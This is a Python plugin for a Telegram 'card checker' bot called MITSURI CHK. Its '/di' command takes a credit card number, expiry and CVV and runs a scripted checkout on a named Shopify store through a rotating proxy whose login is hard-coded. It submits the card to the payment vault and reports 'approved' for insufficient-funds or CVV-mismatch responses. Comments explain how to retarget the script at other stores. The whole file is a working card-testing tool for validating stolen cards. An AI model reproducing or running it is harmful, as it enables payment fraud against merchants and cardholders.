import time
import re
from random import randint
import requests
import time
from random import *
from pyrogram import Client
from pyrogram import filters
import random
import time
from Plugins.Func import connect_to_db
import string
from faker import Faker
from func_bin import get_bin_info
import random
from datetime import datetime, timedelta
from Plugins.SegundoPlano.antispam import *


def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''
def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


@Client.on_message(filters.command("di", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
def Shopify(client, message):
    try:
        
        conn = connect_to_db()
        cursor = conn.cursor()

        chat_id = message.chat.id
        userid = message. from_user. id
        command = "/di"
        spam_message = antispam(userid, command, message)
        if spam_message is not None:
            message.reply (spam_message)
            return
        
        
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (userid,))
        user_data = cursor.fetchone()
        if not user_data:
            return message.reply('Primero debes rgistrarte para usar este comando, usa /register')
        
        
        chat_grupo = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id,))
        chat_grupo = cursor.fetchone()
        
        if all(role not in user_data[0] for role in ['Premium', 'Free', 'Seller', 'Owner']) and all(role not in user_data[0] for role in ['Grupo']):
            return message.reply('No tienes permisos para utilizar este comando, contacta a mi administrador @GolDRoyerOP.')
         
        if user_data:
            rango = user_data[0]
           
 
        if message.from_user is not None:
            username = getattr(message.from_user, 'username', None)
        
        ccs = message.text[len('/di '):]  
        
        x = get_bin_info(ccs[:6])
                        
        inicio = time.time()
        reply = message.reply_to_message
        
            
        if not ccs:
            if not reply or not reply.text:
                return message.reply(f"""       
<b>あ MITSURI CHK あ</b>
<b>ESTADO: <code>ON</code>
GATEWAY: <code>DIONISO</code>
PASARELA: <code>SHOPIFY $14.99</code>
</b>""")
     

            ccs_match = re.search(r"\d{16}[\s|:|::]\d{2}[\s|:|::]\d{4}[\s|:|::]\d{3}", reply.text)
            if not ccs_match:
                return message.reply(f"Agregue una tarjeta Valida.</a> ")
            ccs = ccs_match.group(0)
        
        ccs = ccs.replace(" ", "")

        #----- Extraer la información de la tarjeta de crédito utilizando una expresión regular
        expl = re.split(r"[\s:|]+", ccs)
        if len(expl) < 4:
            # La cadena no tiene suficientes elementos para ser una tarjeta de crédito válida
            return message.reply(f"INGRESE UNA TARJETA VALIDA")

        expl = re.findall(r'\d+', ccs)
        cc = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]      
        ccvip = f"{cc}|{mes}|{ano}|{cvv}"        
        bin_number = cc[:6]       


        if not x: return message.reply(text=f"<b>Ingresa Una Tarjeta Valida.</b> ",quote=True)

        if not re.match(r'^\d{15,16}$', cc):
            return message.reply(f"<b>CARD INVALIDA</b>")

        # Validar la fecha de expiración
        if not re.match(r'^\d{2}/\d{2}(\d{2})?$', f'{mes}/{ano}'):
            return message.reply(f"<b>FECHA INVALIDA</b>")

        # Validar el CVV
        if not re.match(r'^\d{3,4}$', cvv):
            return message.reply(f"<b>CVV INVALIDO")
              
        edite_message = message.reply(f"""
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>DIONISO</code></b>
<b>Proceso: Verificando...</b>
<b>Tarjeta:</b> <code>{ccs}</code>
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        
        session = requests.Session()
        session.proxies = {'https': 'http://zwpbykei-rotate:zwbfdr5xz9nk@p.webshare.io:80'}

        inicio = time.time()
        print("</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '39652128751747'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://speckproducts.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.speckproducts.com/checkouts/")
        checkout_url = req3.url
        print("</> CHECKOUT URL:", checkout_url)
        authenticity_token = get_random_string(86)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        #-----------PASO N° 4 REEMPLAZAR PAYLOAD #2-----------#
        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=jdksjdksjdjkss%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=Australia&checkout%5Bshipping_address%5D%5Bfirst_name%5D=juan&checkout%5Bshipping_address%5D%5Blast_name%5D=perez&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=28+Chalmers+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Surry+Hills&checkout%5Bshipping_address%5D%5Bprovince%5D=NSW&checkout%5Bshipping_address%5D%5Bzip%5D=2010&checkout%5Bshipping_address%5D%5Bphone%5D=02+9281+2222&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=796&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'

        req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
        time.sleep(3)
        
        #-----------PASO N° 5 REEMPLAZAR PAYLOAD #3-----------#
        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Rate%2520%281-4%2520standard%2520items%29-12.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=796&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
        
        req5 = session.post(url=checkout_url,headers=headers,data=payload_3)
        
        time.sleep(3)
        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sin Rol",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            #-----------PASO N° 6 REEMPLAZAR URL DEL SESSION-----------#
            "payment_session_scope": "www.speckproducts.com"
        }

        req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
        token = req6.json()
        id_ = token.get('id')
        print("</> ID SESSION:", id_)

        #-----------PASO N° 7 REEMPLAZAR PAYLOAD #5-----------#
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=48035135620&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=2598&checkout_submitted_request_url=https%3A%2F%2Fwww.toyworld.com.au%2F34943795332%2Fcheckouts%2F3b368fe3800203525f6779afa939e13f%3Fprevious_step%3Dshipping_method%26step%3Dpayment_method&checkout_submitted_page_id=dfe4e809-541A-4608-A1E7-FB7AFF273AB1&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=796&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
        req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
        
        time.sleep(5)

        processing_url = req7.url
        print("</> PROCESANDO URL:",processing_url)
        time.sleep(4)
        
        req8 = session.get(str(processing_url) + '?from_processing_page=1')
        time.sleep(4)

        gateway = "APOLO $17.65"
        end = time.time()
        tiempo = str(inicio - end)[1:5]

        req9 = session.get(req8.url)
        text_resp = req9.text
        resp = find_between(text_resp, 'notice__text">', '<')

        session.close()
        
        #-----------PASO N° 8 REEMPLAZAR RESPONSES DEPENDIENDO EL TIPO DE SHOPIFY-----------#

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):
                        resp = 'Charged'
                        msg = "APPROVED CHARGE✅"
                        respuesta = resp
        elif '/3d_secure_2/' in str(req9.url):
                        resp = '3d_secure_2'
                        msg = "DECLINED 3D❌"
                        respuesta = resp
        elif "Security code was not matched by the processor" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                
        elif "Insufficient Funds" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                    
        elif "Security codes does not match correct format (3-4 digits)" in resp:
                    msg = "APPROVED ✅"
                    respuesta = resp
                
                
        else:
                    msg = "DECLINED ❌"    
                    respuesta = resp 
        
        return edite_message.edit_text(f""" 
<b>MITSURI CHK - SH $14.99 USD</b>
<b>[<code>あ</code>] CC:</b> <code>{ccvip}</code>
<b>[<code>あ</code>] Status:</b> <code>{msg}</code>
<b>[<code>あ</code>] Response:</b> <code>{respuesta}</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<b>[<code>あ</code>] Banco:</b> <code>{x.get("bank_name")}</code>
<b>[<code>あ</code>] Data:</b> <code>{x.get("type")}</code> - <code>{x.get("level")}</code> - <code>{x.get("vendor")}</code>
<b>[<code>あ</code>] Pais:</b> <code>{x.get("country")} {x.get("flag")}</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<b>[<code>あ</code>] Tiempo:</b> <code>{tiempo} segudos</code>
<b>[<code>あ</code>] Checado por:</b> @{username} [{rango}]
<b>[<code>あ</code>] Owner:</b>  @GolDRoyerOP""")

        
        
    except Exception as e:
        print(f"Error inesperado: {e}")
        admin = "-"
        input = "-"
 
        if message.reply_to_message: 
            ccvip = message.reply_to_message.text

        else: 
            ccvip = message.text[len('/pp '):]
        username = message.from_user.username
        #---------- PLANTILLA DE CARGA ------------#
        inicio = time.time()
        gateway = "APOLO $17.65"
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        msg = "DECLINED ❌"    
        respuesta = f"Error (Try Aigan) / Si persiste contacta un admin" 
        